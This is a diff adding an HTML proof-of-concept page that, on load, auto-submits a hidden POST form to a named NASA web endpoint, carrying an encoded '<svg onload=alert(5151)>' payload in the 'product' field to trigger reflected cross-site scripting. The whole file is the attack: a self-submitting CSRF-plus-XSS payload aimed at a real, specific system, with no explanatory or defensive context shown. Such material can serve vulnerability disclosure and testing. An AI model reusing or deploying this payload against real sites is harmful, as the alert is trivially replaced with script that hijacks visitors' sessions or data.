@@ -1,0 +1,12 @@
+<html>
+  <body>
+    <form action="https://mplnet.gsfc.nasa.gov/product-info/ncdump.cgi?x=1" method="POST">
+      <input type="hidden" name="product" value="&lt;svg&#32;onload&#61;alert&#40;5151&#41;&gt;" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      history.pushState('', '', '/');
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
